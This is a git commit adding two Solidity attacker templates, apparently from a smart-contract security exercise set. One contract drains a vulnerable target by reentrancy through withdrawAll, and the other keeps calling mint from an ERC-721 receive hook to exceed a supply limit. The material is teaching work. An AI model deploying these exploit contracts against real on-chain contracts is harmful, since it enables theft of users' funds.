bae998f82062eae66b891482a6d000348d7149a0
Jiefeng Li <xerath7d0@gmail.com>
2023-12-25 12:47:29 +0800

    00 and 01

---
+++ exp/00-template_attacker.sol
@@ -0,0 +1,36 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.13;
+
+interface IVulnerable {
+    function withdrawAll() external; // You should be able to exploit this one
+
+    function withdrawSome(uint256 amount) external; // Can you  exploit this one though? check 02-basic_b for more on this
+
+    function deposit() external payable;
+}
+
+contract Attacker {
+    IVulnerable public target;
+
+    constructor(address _target) {
+        target = IVulnerable(_target);
+    }
+
+    receive() external payable {
+        while (address(target).balance >= 1 ether) {
+            target.withdrawAll();
+        }
+        /*
+            Your code goes here!
+        */
+    }
+
+    function exploit() public payable {
+        target.deposit{value: 1 ether}();
+        target.withdrawAll();
+
+        /*
+            Your code goes here!
+        */
+    }
+}
---
+++ exp/01-template_attacker.sol
@@ -0,0 +1,38 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.13;
+
+interface IVulnerable {
+    function mint() external payable;
+
+    function totalSupply() external view returns (uint256);
+}
+
+contract Attacker {
+    IVulnerable public target;
+
+    constructor(address _target) {
+        target = IVulnerable(_target);
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes calldata
+    ) external returns (bytes4) {
+        while (target.totalSupply() < 10) {
+            target.mint();
+        }
+        /*
+            Your code goes here!
+        */
+        return this.onERC721Received.selector;
+    }
+
+    function exploit() external {
+        target.mint();
+        /*
+            Your code goes here!
+        */
+    }
+}
